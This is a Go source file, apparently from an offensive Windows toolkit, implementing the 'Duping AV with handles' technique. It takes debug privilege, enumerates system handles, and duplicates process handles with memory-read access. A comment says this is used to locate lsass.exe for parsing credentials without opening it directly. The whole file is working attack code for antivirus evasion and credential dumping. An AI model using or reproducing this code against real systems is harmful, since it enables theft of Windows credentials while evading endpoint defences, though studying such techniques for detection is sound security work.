package windows

import (
	"strings"

	sys_windows "golang.org/x/sys/windows"

	"github.com/vincd/savoir/windows/kernel32"
	"github.com/vincd/savoir/windows/ntdll"
)


// From the article "Duping AV with handles", we try to duplicate handle on
// any process
// Source: https://skelsec.medium.com/duping-av-with-handles-537ef985eb03
func FindProcessHandles(processName string) ([]sys_windows.Handle, error) {
	lowerProcessName := strings.ToLower(processName)

	// 1. Get debug privileges.
	if err := ntdll.AskPrivilege(ntdll.SE_DEBUG); err != nil {
		return nil, err
	}

	currentProcessHandle, err := sys_windows.GetCurrentProcess()
	if err != nil {
		return nil, err
	}
	defer sys_windows.CloseHandle(currentProcessHandle)

	// NtQuerySystemInformation will yield all handles opened for all processes.
	// This also includes the PID information of the process for each handle.
	// After this, for each PID/handle:
	systemHandleInfo, err := QuerySystemHandleInformation()
	if err != nil {
		return nil, err
	}

	handles := make([]sys_windows.Handle, 0)
	for _, handleInfo := range systemHandleInfo.Handles {
		if handleInfo.UniqueProcessID == 4 {
			continue
		}

		// 3. OpenProcess with PROCESS_DUP_HANDLE privilege.
		// This allows us to duplicate the handle.
		processHandle, err := sys_windows.OpenProcess(sys_windows.PROCESS_DUP_HANDLE, false, handleInfo.UniqueProcessID)
		if err != nil {
			// fmt.Printf("Cannot open process with pid %d: %s\n", handleInfo.UniqueProcessID, err)
			continue
		}
		defer sys_windows.CloseHandle(processHandle)

		// 4. NtDuplicateObject will get a copy of the handle of the remote
		// process to our process. Recommended to pass at least PROCESS_VM_READ
		// for DesiredAccess.
		var duplicateHandle ntdll.Handle
		status := ntdll.NtDuplicateObject(ntdll.Handle(processHandle), ntdll.Handle(handleInfo.HandleValue), ntdll.Handle(currentProcessHandle), &duplicateHandle, sys_windows.PROCESS_QUERY_INFORMATION|sys_windows.PROCESS_VM_READ, 0, 0)
		if !status.IsSuccess() {
			// fmt.Printf("Cannot duplicate object for %d and handle %d\n", handleInfo.UniqueProcessID, handleInfo.HandleValue)
			continue
		}
		// Don't defer this handle here because we may need to return it later

		// 5. NtQueryObject will tell us if this handle is a Process handle or
		// something else.
		// (there are a lot of types, and OMG GUESS WHAT IT'S NOT DOCUMENTED)
		objInfo, status := ntdll.QueryObject(duplicateHandle, ntdll.ObjectTypeInformation)
		if !status.IsSuccess() {
			sys_windows.CloseHandle(sys_windows.Handle(duplicateHandle))
			continue
		}

		if objInfo.TypeName.String() == "Process" {
			// 7. If it's a process handle, QueryFullProcessImageName invoked
			// with the handle will show the process executable path. If it's
			// lsass.exe then we have found a good match and can begin parsing.
			processName, err := kernel32.QueryFullProcessImageName(sys_windows.Handle(duplicateHandle), 0)
			if err != nil {
				sys_windows.CloseHandle(sys_windows.Handle(duplicateHandle))
				// fmt.Printf("Cannot query full process image name for pid %d: %s\n", handleInfo.UniqueProcessID, err)
				continue
			}

			if !strings.Contains(strings.ToLower(processName), lowerProcessName) {
				sys_windows.CloseHandle(sys_windows.Handle(duplicateHandle))
				continue
			}

			handles = append(handles, sys_windows.Handle(duplicateHandle))
		}
	}

	return handles, nil
}